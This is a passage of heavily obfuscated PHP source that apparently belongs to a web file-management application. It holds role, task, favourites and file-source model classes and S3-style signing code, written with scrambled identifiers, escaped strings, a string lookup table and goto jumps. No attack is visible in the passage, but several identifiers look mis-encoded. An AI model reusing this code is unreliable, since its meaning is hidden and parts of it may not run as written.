$³ø§õÃİ[8] . $this->pathEncode($ıâ€­À“) . $Ï¤æ¶…¾; $Æİ¬ŸÏµ = $this->client->__getSignatureV4($Å˜ôë, $ØŒ•Ê÷, $³Ú½¶¡¨, $ºİáÆöË); if (strpos($Ï¤æ¶…¾, $³ø§õÃİ[268]) === 0) { if (isset($Å˜ôë[$³ø§õÃİ[311]])) { $ ğğ¦†ø = $Å˜ôë[$³ø§õÃİ[311]]; } else { if (isset($Æİ¬ŸÏµ[$³ø§õÃİ[311]])) { $ ğğ¦†ø = $Æİ¬ŸÏµ[$³ø§õÃİ[311]]; } else { $ ğğ¦†ø = hash($³ø§õÃİ[299], $³ø§õÃİ[12]); } } return array($³ø§õÃİ[274] => $Æİ¬ŸÏµ[$³ø§õÃİ[274]], $³ø§õÃİ[311] => $ ğğ¦†ø, $³ø§õÃİ[265] => $Æİ¬ŸÏµ[$³ø§õÃİ[314]]); } return $Æİ¬ŸÏµ[$³ø§õÃİ[274]]; } public function listUploadParts($¼Ó³•ó, $ÛöôÇÚÏ = array()) { $¾¦ğä”‹ =& $_SERVER[ÕŸ²ó÷å]; $„äÇŠáÄ = str_replace($¾¦ğä”‹[275], $¾¦ğä”‹[12], $ÛöôÇÚÏ[$¾¦ğä”‹[179]]); $ê’ˆ­€ = $this->client->listParts($this->bucket, $¼Ó³•ó, $„äÇŠáÄ); if (!$ê’ˆ­€) { return !1; } $õí”œéø = $¾¦ğä”‹[315]; foreach ($ê’ˆ­€ as $“ñêôòš) { $õí”œéø .= $¾¦ğä”‹[316] . "\74\120\141\162\164\x4e\x75\155\x62\x65\162\76{$“ñêôòš[$¾¦ğä”‹[317]]}\x3c\57\120\x61\x72\x74\x4e\x75\x6d\142\x65\x72\76\xa" . "\74\105\x54\x61\147\76{$“ñêôòš[$¾¦ğä”‹[318]]}\x3c\x2f\x45\x54\141\x67\76\12" . $¾¦ğä”‹[319]; } $õí”œéø .= $¾¦ğä”‹[320]; $“êšß = array(); $åâÙı¾à = explode($¾¦ğä”‹[220], $this->getHost()); $ğã·øĞª = array($¾¦ğä”‹[312] => $åâÙı¾à[1], $¾¦ğä”‹[256] => $¾¦ğä”‹[133], $¾¦ğä”‹[301] => strlen($õí”œéø)); $œæÁıï÷ = $¾¦ğä”‹[267]; $¦¡´”ş¸ = $¾¦ğä”‹[8] . $this->pathEncode($¼Ó³•ó) . $ÛöôÇÚÏ[$¾¦ğä”‹[179]]; $…äÉÂ = $this->client->__getSignatureV4($“êšß, $ğã·øĞª, $œæÁıï÷, $¦¡´”ş¸, $õí”œéø); return array($¾¦ğä”‹[274] => $…äÉÂ[$¾¦ğä”‹[274]], $¾¦ğä”‹[265] => $…äÉÂ[$¾¦ğä”‹[314]], $¾¦ğä”‹[276] => $ê’ˆ­€, $¾¦ğä”‹[311] => $…äÉÂ[$¾¦ğä”‹[311]]); } public function link($îĞÇî“³, $à®íÊç = array()) { return parent::link($îĞÇî“³, $à®íÊç); } public function fileOut($ƒÀ¼ƒ¬, $Èƒ¿â¡ê = false, $èõéïÆ = false, $»û·Š™„ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÕŸ²ó÷å][321])) { return parent::fileOutServer($ƒÀ¼ƒ¬, $Èƒ¿â¡ê, $èõéïÆ, $»û·Š™„); } parent::fileOut($ƒÀ¼ƒ¬, $Èƒ¿â¡ê, $èõéïÆ, $»û·Š™„); } public function fileOutImage($Ù—Áè‘ä, $Üôù“ = 250) { if (strstr($this->endpoint, $_SERVER[ÕŸ²ó÷å][321])) { return parent::fileOutImageServer($Ù—Áè‘ä, $Üôù“); } parent::fileOutImage($Ù—Áè‘ä, $Üôù“); } public function fileOutLink($²Â³÷Ûˆ) { $ƒ­ÂüáÌ =& $_SERVER[ÕŸ²ó÷å]; if (substr($²Â³÷Ûˆ, 0, 7) == $ƒ­ÂüáÌ[322]) { $²Â³÷Ûˆ = $ƒ­ÂüáÌ[323] . substr($²Â³÷Ûˆ, 7); } header($ƒ­ÂüáÌ[185] . $²Â³÷Ûˆ); die; } } define($_SERVER[ÕŸ²ó÷å][324], 1); goto dòÎª©¿¿; a½ˆÙ‰Í×£: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\x72\157\x6c\x65\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\150", "\x6c\x61\142\x65\x6c", "\x64\x69\163\160\x6c\141\x79", "\x73\x79\x73\164\145\155", "\x64\x65\x73\143", "\x69\x67\x6e\157\162\x65\x45\x78\x74", "\x69\147\x6e\157\x72\x65\106\x69\x6c\145\123\x69\172\145", "\x61\x64\155\x69\156\x69\x73\x74\x72\x61\x74\157\162", "\x73\x6f\162\164"); public function listData($õ¦î·÷Û = false, $ËºÙİ¢á = "\163\x6f\x72\x74", $¥¸´Èà = false) { $‰ Ğ­ =& $_SERVER[ÕŸ²ó÷å]; $”ÙËÖºó = parent::listData($õ¦î·÷Û, $ËºÙİ¢á, $¥¸´Èà); if (!$õ¦î·÷Û) { foreach ($”ÙËÖºó as $÷¼Ëå®ä => $ß®ıÕ—©) { if ($ß®ıÕ—©[$‰ Ğ­[2179]] == 1) { $”ÙËÖºó[$÷¼Ëå®ä][$‰ Ğ­[535]] = LNG($‰ Ğ­[2445]); } } } return $”ÙËÖºó; } public function update($é¿¶ÛœÏ, $–®Ñ“Â‡) { $¦½ì†ıö =& $_SERVER[ÕŸ²ó÷å]; $ëÑŞù¯ = parent::listData($é¿¶ÛœÏ); $ı¹•»› = $this->findByName($–®Ñ“Â‡[$¦½ì†ıö[32]]); if (!$ëÑŞù¯ || $ı¹•»› && $ı¹•»›[$¦½ì†ıö[484]] != $ëÑŞù¯[$¦½ì†ıö[484]]) { return !1; } if ($ı¹•»›[$¦½ì†ıö[2179]] == 1) { $–®Ñ“Â‡ = array($¦½ì†ıö[32] => $–®Ñ“Â‡[$¦½ì†ıö[32]], $¦½ì†ıö[1995] => $–®Ñ“Â‡[$¦½ì†ıö[1995]]); } $this->filterAuth($–®Ñ“Â‡[$¦½ì†ıö[496]]); return parent::update($é¿¶ÛœÏ, $–®Ñ“Â‡); } public function remove($¤•…–‚) { $Åª¬õÑ² = parent::listData($¤•…–‚); if (!$Åª¬õÑ² || $Åª¬õÑ²[$_SERVER[ÕŸ²ó÷å][201]]) { return !1; } return parent::remove($¤•…–‚); } public function add($¬ÔÙÌğç) { $”¨Õ¤Î =& $_SERVER[ÕŸ²ó÷å]; $÷áåÂã¼ = $¬ÔÙÌğç[$”¨Õ¤Î[32]]; if ($this->findByName($÷áåÂã¼)) { return !1; } $ë‰×’ß = array($”¨Õ¤Î[503] => $÷áåÂã¼, $”¨Õ¤Î[1978] => $”¨Õ¤Î[12], $”¨Õ¤Î[1974] => $”¨Õ¤Î[1982], $”¨Õ¤Î[2446] => 1, $”¨Õ¤Î[1977] => 0, $”¨Õ¤Î[2447] => 0, $”¨Õ¤Î[1976] => $this->getSort()); $¬ÔÙÌğç = array_merge($ë‰×’ß, $¬ÔÙÌğç); $this->filterAuth($¬ÔÙÌğç[$”¨Õ¤Î[496]]); return parent::insert($¬ÔÙÌğç); } private function getSort() { $ ¼ğÓ•÷ =& $_SERVER[ÕŸ²ó÷å]; $Ë¬³®™£ = parent::listData(); $ğŠíÚâé = array_to_keyvalue($Ë¬³®™£, $ ¼ğÓ•÷[12], $ ¼ğÓ•÷[1996]); return empty($ğŠíÚâé) ? 0 : max($ğŠíÚâé) + 1; } private function filterAuth(&$”úĞ¡¼ª) { $©¡áÂğö =& $_SERVER[ÕŸ²ó÷å]; $‰à–Ğß = array(); $€…¹•Şä = array_filter(explode($©¡áÂğö[50], $”úĞ¡¼ª)); foreach ($€…¹•Şä as $”úĞ¡¼ª) { $¹í¿õ´Ü = explode($©¡áÂğö[10], $”úĞ¡¼ª); if ($¹í¿õ´Ü[0] == $©¡áÂğö[2448] && $¹í¿õ´Ü[1] != $©¡áÂğö[1278]) { $¼šÆİ€ = $¹í¿õ´Ü[0] . $©¡áÂğö[10] . $¹í¿õ´Ü[1] . $©¡áÂğö[2449]; if (!in_array($¼šÆİ€, $€…¹•Şä)) { $‰à–Ğß[] = $¼šÆİ€; } } $‰à–Ğß[] = $”úĞ¡¼ª; } $”úĞ¡¼ª = implode($©¡áÂğö[50], $‰à–Ğß); } public function findRoleDefault() { $Âüœı—û =& $_SERVER[ÕŸ²ó÷å]; $Ò·×¤üÏ = parent::listData(); $–Í¬Ôâ = !1; foreach ($Ò·×¤üÏ as $´ãÄßáª) { if (!$´ãÄßáª || $´ãÄßáª[$Âüœı—û[1994]] == $Âüœı—û[238] || $´ãÄßáª[$Âüœı—û[2179]] == 1) { continue; } if (strstr($´ãÄßáª[$Âüœı—û[496]], $Âüœı—û[2450])) { continue; } if (!strstr($´ãÄßáª[$Âüœı—û[496]], $Âüœı—û[2451])) { continue; } if (!$–Í¬Ôâ) { $–Í¬Ôâ = $´ãÄßáª; continue; } $ùœÔ´ê÷ = explode($Âüœı—û[50], $–Í¬Ôâ[$Âüœı—û[496]]); $İ‹¿Ìù§ = explode($Âüœı—û[50], $´ãÄßáª[$Âüœı—û[496]]); if (count($ùœÔ´ê÷) > count($İ‹¿Ìù§)) { $–Í¬Ôâ = $´ãÄßáª; } } return $–Í¬Ôâ ? $–Í¬Ôâ[$Âüœı—û[484]] : $Âüœı—û[12]; } public function sort($…¾ÑÁô, $ÖŞ¨âÙ™) { return parent::update($…¾ÑÁô, $ÖŞ¨âÙ™); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x74\141\163\x6b\114\151\163\164"; public $field = array("\x6e\141\155\145", "\164\x79\x70\x65", "\145\166\x65\156\x74", "\164\x69\x6d\145", "\x64\145\x73\x63", "\x73\x79\x73\x74\145\155", "\145\x6e\x61\142\154\x65", "\x6c\x61\163\164\122\x75\x6e", "\163\x6f\162\x74"); public function listData($««¾öò = false, $ıÅøŠ° = "\163\157\x72\164", $´¾Œ—µï = false) { return parent::listData($««¾öò, $ıÅøŠ°, $´¾Œ—µï); } public function add($¥÷æÀÅ–) { $ã‰àšÏ£ =& $_SERVER[ÕŸ²ó÷å]; $ı®î‘” = $this->findByName($¥÷æÀÅ–[$ã‰àšÏ£[32]]); if ($ı®î‘”) { return !1; } $¥÷æÀÅ–[$ã‰àšÏ£[1724]] = 0; $¥÷æÀÅ–[$ã‰àšÏ£[1996]] = $this->getSort(); return parent::insert($¥÷æÀÅ–); } private function getSort() { $ª·Êµİ› =& $_SERVER[ÕŸ²ó÷å]; $…û“Åò = parent::listData(); $Ùôì¦ü­ = array_to_keyvalue($…û“Åò, $ª·Êµİ›[12], $ª·Êµİ›[1996]); return empty($Ùôì¦ü­) ? 0 : max($Ùôì¦ü­) + 1; } public function update($†Òıä±à, $¬ã™ûèí) { $ŞÔå¶€† =& $_SERVER[ÕŸ²ó÷å]; $®úØ“Ş = $this->listData($†Òıä±à); $œÙõ•‡— = $this->findByName($¬ã™ûèí[$ŞÔå¶€†[32]]); if (!$®úØ“Ş || $œÙõ•‡— && $œÙõ•‡—[$ŞÔå¶€†[484]] != $®úØ“Ş[$ŞÔå¶€†[484]]) { return !1; } return parent::update($†Òıä±à, $¬ã™ûèí); } public function remove($•Åàğ‹, $š‚àŞÖ« = false) { $ËÜ‚õÚ¿ =& $_SERVER[ÕŸ²ó÷å]; $‰­ÙŠÆ§ = $this->listData($•Åàğ‹); if (!$‰­ÙŠÆ§) { return; } if (!$š‚àŞÖ« && $‰­ÙŠÆ§[$ËÜ‚õÚ¿[201]] == $ËÜ‚õÚ¿[101]) { return !1; } return parent::remove($•Åàğ‹); } public function enable($ä®Íî½›, $³è¤ãŞõ) { return $this->update($ä®Íî½›, array($_SERVER[ÕŸ²ó÷å][2440] => $³è¤ãŞõ)); } public function run($Ÿèª™ˆÒ) { return $this->update($Ÿèª™ˆÒ, array($_SERVER[ÕŸ²ó÷å][2452] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($³‡†££Ø) { $´Çòœ” =& $_SERVER[ÕŸ²ó÷å]; return array($´Çòœ”[2087] => array(USER_ID, $´Çòœ”[2453])); } protected function listData() { $²÷ñ¥Ö =& $_SERVER[ÕŸ²ó÷å]; $¡ƒªı¬Ì = array($²÷ñ¥Ö[1764] => USER_ID, $²÷ñ¥Ö[566] => 0); $Ìü¨“…† = $²÷ñ¥Ö[2454]; $”ã¡‘¦ = $this->field($Ìü¨“…†)->where($¡ƒªı¬Ì)->order($²÷ñ¥Ö[2455])->select(); return $”ã¡‘¦ ? $”ã¡‘¦ : array(); } protected function resetCache() { } protected function listView() { $Šˆ”àÈ =& $_SERVER[ÕŸ²ó÷å]; $”áÙÔÉ… = $this->listData(); $È¯„† = array_filter_by_field($”áÙÔÉ…, $Šˆ”àÈ[33], $Šˆ”àÈ[499]); $ïº•‘îµ = array_to_keyvalue($È¯„†, $Šˆ”àÈ[12], $Šˆ”àÈ[97]); if (!$ïº•‘îµ) { return $”áÙÔÉ…; } $Ôâ‚«Ê = 2000; $·ŸÏî€á = array($Šˆ”àÈ[500] => array($Šˆ”àÈ[501], $ïº•‘îµ)); $¥ÎîÃ¹¹ = Model($Šˆ”àÈ[908])->listSource($·ŸÏî€á, $Ôâ‚«Ê); $¥ÎîÃ¹¹ = array_merge($¥ÎîÃ¹¹[$Šˆ”àÈ[96]], $¥ÎîÃ¹¹[$Šˆ”àÈ[95]]); $¥ÎîÃ¹¹ = array_to_keyvalue($¥ÎîÃ¹¹, $Šˆ”àÈ[203]); foreach ($”áÙÔÉ… as $ µÑíæ¸ => $œÒº˜°û) { $Ü¡öË¨Á = $¥ÎîÃ¹¹[$œÒº˜°û[$Šˆ”àÈ[97]]]; $Ü¡öË¨Á = $Ü¡öË¨Á ? $Ü¡öË¨Á : array(); $”áÙÔÉ…[$ µÑíæ¸] = array_merge($Ü¡öË¨Á, $œÒº˜°û); } return $”áÙÔÉ…; } protected function addFav($ò„”™É, $ŠÖğõ‹† = '', $ø‰ÜŠ•Œ = "\163\157\x75\162\143\145") { $œ…‰Á÷ =& $_SERVER[ÕŸ²ó÷å]; $°ş¡õ¾ = array($œ…‰Á÷[1764] => USER_ID, $œ…‰Á÷[566] => 0, $œ…‰Á÷[505] => $ø‰ÜŠ•Œ, $œ…‰Á÷[504] => $ò„”™É); if ($this->where($°ş¡õ¾)->find()) { return !1; } $°ş¡õ¾ = array($œ…‰Á÷[1764] => USER_ID, $œ…‰Á÷[566] => 0); $—¸ƒ³µ± = $this->where($°ş¡õ¾)->max($œ…‰Á÷[1996]); if (!$—¸ƒ³µ±) { $—¸ƒ³µ± = 0; } if (!$ŠÖğõ‹† && $ø‰ÜŠ•Œ == $œ…‰Á÷[499]) { $»»šœ£ = Model($œ…‰Á÷[1421])->where(array($œ…‰Á÷[500] => $ò„”™É))->find(); if (!$»»šœ£) { return !1; } $ŠÖğõ‹† = $»»šœ£[$œ…‰Á÷[32]]; } $ŠÖğõ‹† = $this->getAutoName($ŠÖğõ‹†); $úËğ®¶å = array($œ…‰Á÷[1764] => USER_ID, $œ…‰Á÷[566] => 0, $œ…‰Á÷[503] => $ŠÖğõ‹†, $œ…‰Á÷[504] => $ò„”™É, $œ…‰Á÷[505] => $ø‰ÜŠ•Œ, $œ…‰Á÷[1976] => $—¸ƒ³µ± + 1); return $this->add($úËğ®¶å); } protected function remove($´á€æ˜) { $÷˜š¬ÍĞ =& $_SERVER[ÕŸ²ó÷å]; $÷“’­ûÑ = array($÷˜š¬ÍĞ[1764] => USER_ID, $÷˜š¬ÍĞ[502] => $´á€æ˜); return $this->where($÷“’­ûÑ)->delete(); } protected function removeByName($ŞÑÍ¿¿õ) { $ğ‘èÜĞÊ =& $_SERVER[ÕŸ²ó÷å]; $’ÆœƒÙŒ = array($ğ‘èÜĞÊ[1764] => USER_ID, $ğ‘èÜĞÊ[503] => $ŞÑÍ¿¿õ, $ğ‘èÜĞÊ[566] => 0); return $this->where($’ÆœƒÙŒ)->delete(); } protected function rename($ÛÉü˜¤Î, $Ü„ş‚úÏ) { $ÒˆÖ•š¯ =& $_SERVER[ÕŸ²ó÷å]; if ($ÛÉü˜¤Î == $Ü„ş‚úÏ) { return !1; } $«Şò°¶Ğ = $this->getAutoName($Ü„ş‚úÏ); if ($Ü„ş‚úÏ != $«Şò°¶Ğ) { return !1; } $§ÍóİÀ = array($ÒˆÖ•š¯[1764] => USER_ID, $ÒˆÖ•š¯[566] => 0, $ÒˆÖ•š¯[32] => $ÛÉü˜¤Î); return $this->where($§ÍóİÀ)->save(array($ÒˆÖ•š¯[32] => $Ü„ş‚úÏ)); } protected function resetSort($Ñ® ï·) { $Ø„øÇîñ =& $_SERVER[ÕŸ²ó÷å]; $Ñ® ï· = is_array($Ñ® ï·) ? $Ñ® ï· : array(); $ÉÇö¦×Â = array($Ø„øÇîñ[1764] => USER_ID); for ($â²óÁƒÜ = 0; $â²óÁƒÜ < count($Ñ® ï·); $â²óÁƒÜ++) { $ÉÇö¦×Â[$Ø„øÇîñ[502]] = $Ñ® ï·[$â²óÁƒÜ]; $this->where($ÉÇö¦×Â)->save(array($Ø„øÇîñ[1976] => $â²óÁƒÜ + 1)); } return !0; } protected function moveTop($¢æ”ˆÓ) { $¬¶®£ìÒ =& $_SERVER[ÕŸ²ó÷å]; $Ï´ëĞÅı = array($¬¶®£ìÒ[1764] => USER_ID, $¬¶®£ìÒ[566] => 0); $››‰èş = $this->where($Ï´ëĞÅı)->where(array($¬¶®£ìÒ[32] => $¢æ”ˆÓ))->find(); if (!$››‰èş) { return; } $¦¼•Üîò = $this->field($¬¶®£ìÒ[484])->where($Ï´ëĞÅı)->order($¬¶®£ìÒ[2455])->select(); $¦¼•Üîò = array_to_keyvalue($¦¼•Üîò, $¬¶®£ìÒ[12], $¬¶®£ìÒ[484]); $Ñ£ëˆ¿¢ = $¦¼•Üîò; $¦¼•Üîò = array_remove_value($¦¼•Üîò, $››‰èş[$¬¶®£ìÒ[484]]); array_unshift($¦¼•Üîò, $››‰èş[$¬¶®£ìÒ[484]]); return $this->resetSort($¦¼•Üîò); } protected function moveBottom($û¬‰ßÀÜ) { $ûÅ••Ø =& $_SERVER[ÕŸ²ó÷å]; $ËøÈä¾¿ = array($ûÅ••Ø[1764] => USER_ID, $ûÅ••Ø[566] => 0); $ûÊâ¥ó = $this->where($ËøÈä¾¿)->max($ûÅ••Ø[1996]); $¬ìøÏ = array($ûÅ••Ø[1996] => $ûÊâ¥ó + 1); return $this->where($ËøÈä¾¿)->where(array($ûÅ••Ø[32] => $û¬‰ßÀÜ))->save($¬ìøÏ); } private function getAutoName($Êùü­Ş×) { $Ì›£˜§³ =& $_SERVER[ÕŸ²ó÷å]; $ÀùÛŠ€õ = array($Ì›£˜§³[1764] => USER_ID, $Ì›£˜§³[566] => 0); $ªÈõª¹ = $this->field($Ì›£˜§³[32])->where($ÀùÛŠ€õ)->select(); $ªÈõª¹ = array_to_keyvalue($ªÈõª¹, $Ì›£˜§³[12], $Ì›£˜§³[32]); if (!$ªÈõª¹ || !in_array($Êùü­Ş×, $ªÈõª¹)) { return $Êùü­Ş×; } for ($­ÕŠ‡É‘ = 0; $­ÕŠ‡É‘ < count($ªÈõª¹); $­ÕŠ‡É‘++) { if (!in_array($Êùü­Ş× . "\x28{$­ÕŠ‡É‘}\x29", $ªÈõª¹)) { return $Êùü­Ş× . "\50{$­ÕŠ‡É‘}\51"; } } return $Êùü­Ş× . "\50{$­ÕŠ‡É‘}\51"; } } goto F¿¨å›ŒÆ; fâ¼¬âĞØŠ: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\143\145"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\155\x65" => "\x69\157\137\163\x6f\165\x72\143\x65\x5f\155\145\x74\141", "\x6d\x65\x74\x61\x46\x69\x65\x6c\144" => "\x73\157\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\157\144\151\146\171\124\x69\x6d\x65", "\164\x69\x6d\145", "\x69\156\163\x65\162\164", "\x66\x75\156\143\x74\x69\x6f\156"), array("\143\x72\145\141\x74\x65\124\x69\155\x65", "\164\x69\x6d\145", "\151\156\163\145\162\164", "\x66\165\156\143\164\x69\157\156"), array("\166\151\x65\167\x54\x69\155\x65", "\x74\151\155\145", "\151\156\x73\145\x72\x74", "\146\165\156\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ò”ı¥÷Ù) { return $this->listSource(array($_SERVER[ÕŸ²ó÷å][486] => $Ò”ı¥÷Ù)); } public function typeName($€¥„ıø×) { static $óÆÀÄéã = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $óÆÀÄéã[$€¥„ıø× . $_SERVER[ÕŸ²ó÷å][12]]; } public function sourceListInfo($Ôİé…šõ, $‰ Ü…¨ = false) { $¥ Çë£Ú =& $_SERVER[ÕŸ²ó÷å]; $Ôİé…šõ = $Ôİé…šõ ? $Ôİé…šõ : array(); $Ôİé…šõ = array_filter(array_unique($Ôİé…šõ)); if (!$Ôİé…šõ) { return array(); } $¿°²ãıë = $this->where(array($¥ Çë£Ú[203] => array($¥ Çë£Ú[7], $Ôİé…šõ)))->select(); $this->_listDataApply($¿°²ãıë, $‰ Ü…¨); return array_to_keyvalue($¿°²ãıë, $¥ Çë£Ú[203]); } public function pathInfoFilter(&$ùé÷Óó›) { $µØ§êÁÛ =& $_SERVER[ÕŸ²ó÷å]; static $ö†ÉÉÅ¿ = false; static $ÖŞÉ˜¹ = false; static $‘¬ÒÕö· = false; if (!$ö†ÉÉÅ¿) { $…Éö•Í = $µØ§êÁÛ[487]; $…Éö•Í .= $µØ§êÁÛ[488]; $…Éö•Í .= $µØ§êÁÛ[489]; $©”­úßª = $µØ§êÁÛ[490]; $ÛÊòîø = explode($µØ§êÁÛ[50], $©”­úßª); $ö†ÉÉÅ¿ = explode($µØ§êÁÛ[50], $…Éö•Í); $ÖŞÉ˜¹ = array(); foreach ($ö†ÉÉÅ¿ as $¹”ËàÃ) { if (in_array($¹”ËàÃ, $ÛÊòîø)) { continue; } $ÖŞÉ˜¹[] = $¹”ËàÃ; } $‘¬ÒÕö· = explode($µØ§êÁÛ[50], $µØ§êÁÛ[491]); } foreach ($‘¬ÒÕö· as $†ùş‡å¢) { if (isset($ùé÷Óó›[$†ùş‡å¢])) { $ùé÷Óó›[$†ùş‡å¢] = intval($ùé÷Óó›[$†ùş‡å¢]); } } $ùé÷Óó›[$µØ§êÁÛ[97]] = $µØ§êÁÛ[492] . $ùé÷Óó›[$µØ§êÁÛ[203]] . $µØ§êÁÛ[493]; $ùé÷Óó›[$µØ§êÁÛ[33]] = $ùé÷Óó›[$µØ§êÁÛ[494]] == 1 ? $µØ§êÁÛ[88] : $µØ§êÁÛ[240]; $ùé÷Óó›[$µØ§êÁÛ[200]] = $this->typeName($ùé÷Óó›[$µØ§êÁÛ[200]]); if ($ùé÷Óó›[$µØ§êÁÛ[494]] != 1) { $ùé÷Óó›[$µØ§êÁÛ[179]] = $ùé÷Óó›[$µØ§êÁÛ[495]]; unset($ùé÷Óó›[$µØ§êÁÛ[495]]); } $ÚÅ‹ı¥Æ = $ö†ÉÉÅ¿; if (isset($ùé÷Óó›[$µØ§êÁÛ[496]]) && $ùé÷Óó›[$µØ§êÁÛ[496]][$µØ§êÁÛ[497]] == -1) { $ÚÅ‹ı¥Æ = $ÖŞÉ˜¹; } $ùé÷Óó› = array_field_key($ùé÷Óó›, $ÚÅ‹ı¥Æ); return $ùé÷Óó›; } public function listUserFav() { $±øûôÄ• =& $_SERVER[ÕŸ²ó÷å]; $„áëºí = Model($±øûôÄ•[498])->listData(); $Î‘­•šü = array_filter_by_field($„áëºí, $±øûôÄ•[33], $±øûôÄ•[499]); $Î‘­•šü = array_to_keyvalue($Î‘­•šü, $±øûôÄ•[12], $±øûôÄ•[97]); if ($Î‘­•šü) { $‡ˆ íØö = $this->listSource(array($±øûôÄ•[500] => array($±øûôÄ•[501], $Î‘­•šü))); } $‡ˆ íØö = array_to_keyvalue($‡ˆ íØö[$±øûôÄ•[454]], $±øûôÄ•[203]); foreach ($„áëºí as &$úÖ¢™É‚) { $úÖ¢™É‚ = array($±øûôÄ•[502] => $úÖ¢™É‚[$±øûôÄ•[484]], $±øûôÄ•[503] => $úÖ¢™É‚[$±øûôÄ•[32]], $±øûôÄ•[504] => $úÖ¢™É‚[$±øûôÄ•[97]], $±øûôÄ•[505] => $úÖ¢™É‚[$±øûôÄ•[33]], $±øûôÄ•[506] => $úÖ¢™É‚[$±øûôÄ•[241]], $±øûôÄ•[507] => $úÖ¢™É‚[$±øûôÄ•[98]]); if ($úÖ¢™É‚[$±øûôÄ•[33]] == $±øûôÄ•[499] && $‡ˆ íØö[$úÖ¢™É‚[$±øûôÄ•[97]]]) { $úÖ¢™É‚[$±øûôÄ•[100]] = $‡ˆ íØö[$úÖ¢™É‚[$±øûôÄ•[97]]]; } } unset($úÖ¢™É‚); return $„áëºí; } public function listUserTag($½²âÌí—) { $õÂ¥öÀá =& $_SERVER[ÕŸ²ó÷å]; if ($½²âÌí— && !is_array($½²âÌí—)) { $½²âÌí— = array($½²âÌí—); } $¶šÇøó¬ = Model($õÂ¥öÀá[508])->listData(); $æÙ­‡Ö = array(); $—Âøû™× = array(); foreach ($¶šÇøó¬ as $ØÕ†°’æ) { $–È­«–ù = $ØÕ†°’æ[$õÂ¥öÀá[97]]; if (!$–È­«–ù) { continue; } if (!isset($—Âøû™×[$–È­«–ù])) { $—Âøû™×[$–È­«–ù] = array(); } $—Âøû™×[$–È­«–ù][] = $ØÕ†°’æ[$õÂ¥öÀá[509]]; $æÙ­‡Ö[$ØÕ†°’æ[$õÂ¥öÀá[97]]] = $ØÕ†°’æ; } $»ÈÎ¿Œ¯ = array(); $°Áú¦õÌ = array(); $·¦ÊŠºË = array(); foreach ($—Âøû™× as $àµµèÂ => $Ò§ß¶òÏ) { $šÁÅĞ—ß = !0; if (!$½²âÌí—) { $»ÈÎ¿Œ¯[] = $àµµèÂ; continue; } foreach ($½²âÌí— as $ò¨è£€Ù) { if (!in_array($ò¨è£€Ù, $Ò§ß¶òÏ)) { $šÁÅĞ—ß = !1; break; } } if (!$šÁÅĞ—ß) { continue; } if (!is_numeric($àµµèÂ)) { $™öÉû¬Œ = $æÙ­‡Ö[$àµµèÂ]; $şÇô¯€Ÿ = array($õÂ¥öÀá[32] => $™öÉû¬Œ[$õÂ¥öÀá[32]], $õÂ¥öÀá[97] => $™öÉû¬Œ[$õÂ¥öÀá[97]], $õÂ¥öÀá[33] => $™öÉû¬Œ[$õÂ¥öÀá[33]], $õÂ¥öÀá[100] => array($õÂ¥öÀá[510] => 1), $õÂ¥öÀá[242] => !0); if ($™öÉû¬Œ[$õÂ¥öÀá[33]] == $õÂ¥öÀá[240]) { $·¦ÊŠºË[] = $şÇô¯€Ÿ; } if ($™öÉû¬Œ[$õÂ¥öÀá[33]] == $õÂ¥öÀá[88]) { $°Áú¦õÌ[] = $şÇô¯€Ÿ; } continue; } $»ÈÎ¿Œ¯[] = $àµµèÂ; } if ($»ÈÎ¿Œ¯) { $®ÈÅ½Æõ = $this->listSource(array($õÂ¥öÀá[500] => array($õÂ¥öÀá[501], $»ÈÎ¿Œ¯))); } $®ÈÅ½Æõ = $®ÈÅ½Æõ ? $®ÈÅ½Æõ : array($õÂ¥öÀá[95] => array(), $õÂ¥öÀá[96] => array()); $®ÈÅ½Æõ[$õÂ¥öÀá[95]] = array_merge($®ÈÅ½Æõ[$õÂ¥öÀá[95]], $°Áú¦õÌ); $®ÈÅ½Æõ[$õÂ¥öÀá[96]] = array_merge($®ÈÅ½Æõ[$õÂ¥öÀá[96]], $·¦ÊŠºË); if (isset($®ÈÅ½Æõ[$õÂ¥öÀá[451]]) && count($»ÈÎ¿Œ¯) == $®ÈÅ½Æõ[$õÂ¥öÀá[451]][$õÂ¥öÀá[452]]) { return $®ÈÅ½Æõ; } $òÉšú Ş = array(); $¡Óá•© = array_to_keyvalue($®ÈÅ½Æõ[$õÂ¥öÀá[95]], $õÂ¥öÀá[12], $õÂ¥öÀá[203]); $¢¾Ú’’í = array_to_keyvalue($®ÈÅ½Æõ[$õÂ¥öÀá[96]], $õÂ¥öÀá[12], $õÂ¥öÀá[203]); $à··¼ÌÌ = array_merge($¢¾Ú’’í, $¡Óá•©); foreach ($»ÈÎ¿Œ¯ as $–È­«–ù) { if (!in_array($–È­«–ù, $à··¼ÌÌ)) { $òÉšú Ş[] = $–È­«–ù; } } if ($òÉšú Ş) { Model($õÂ¥öÀá[511])->removeBySource($òÉšú Ş); } return $®ÈÅ½Æõ; } public function listUserRecycle() { $‡¾Íı®ƒ =& $_SERVER[ÕŸ²ó÷å]; $Î€°®Ü = Model($‡¾Íı®ƒ[512])->listData(); if (!$Î€°®Ü) { return array(); } $ÑúÈŸÃ¬ = array($‡¾Íı®ƒ[500] => array($‡¾Íı®ƒ[501], $Î€°®Ü), $‡¾Íı®ƒ[513] => 1); return $this->listSource($ÑúÈŸÃ¬); } public function listSource($íÔ’Ğ»õ, $Ğë²Ñ¼ô = 3000, $Ÿ²ŞÈñÊ = false) { $şûä©›Ø =& $_SERVER[ÕŸ²ó÷å]; if (!isset($íÔ’Ğ»õ[$şûä©›Ø[514]])) { 